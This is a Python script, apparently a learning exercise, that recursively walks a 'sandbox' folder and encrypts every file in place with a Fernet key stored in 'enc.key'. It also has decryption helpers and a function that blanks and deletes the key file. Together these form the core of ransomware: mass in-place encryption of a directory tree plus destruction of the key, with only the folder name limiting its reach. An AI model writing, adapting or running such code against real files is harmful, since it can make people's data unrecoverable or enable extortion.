import os
import time
from cryptography.fernet import Fernet

def explore(path = ""):
    file_paths = []
    for dirpath ,dirname, filename in os.walk(path):
        # print(f"path : {dirpath} , dirname : {dirname} , filename : {filename}")
        for file in filename:
            fpath = dirpath+"\\"+file
            file_paths.append(fpath)
    return file_paths

def display(ls):
    for i,j in enumerate(ls):
        print(i , " : " , j)

def display_f(path):
    with open(path,"r") as f:
            for i,k in enumerate(f):
                print(i , " : " , k)
                time.sleep(0.1)

def encrypt_f(path,egg):
    
    try : 
        with open(path, "br") as file:
            txt = file.read()

        encrypted = egg.encrypt(txt)

        with open(path,"bw") as file:
            file.write(encrypted)
    except Exception as e:
        print("file not found" , e)

def decrypt_f(path,egg):
    try : 
        with open(path, "br") as file:
            txt = file.read()

        encrypted = egg.decrypt(txt)

        with open(path,"bw") as file:
            file.write(encrypted)
    except Exception as e:
        print("file not found" , e)


def full_encrypt(ls,egg):
    for file in ls:
        encrypt_f(file,egg)

def full_decrypt(ls,egg):
    for file in ls :
        decrypt_f(file,egg)

def tesst(func,file,egg):
    display_f(file)
    func(file,egg)
    display_f(file)

def delete_key(path = "enc.key"):
    with open(path,'w') as f:
        f.write("")

    try : 
        if os.path.exists(path):
            os.remove(path)
    except:
        print("error delete")



def main():
    file_paths = explore("sandbox")
    try : 
        if os.path.exists("enc.key"):
            with open("enc.key","br") as file:
                encryption_key = file.read()
        else : 
            with open("enc.key","bw") as file:
                encryption_key = Fernet.generate_key()
                file.write(encryption_key)
    except:
        print("error")
    


    egg = Fernet(encryption_key)
    full_encrypt(file_paths,egg)
    print("encryption done")





if __name__ == "__main__":
    main()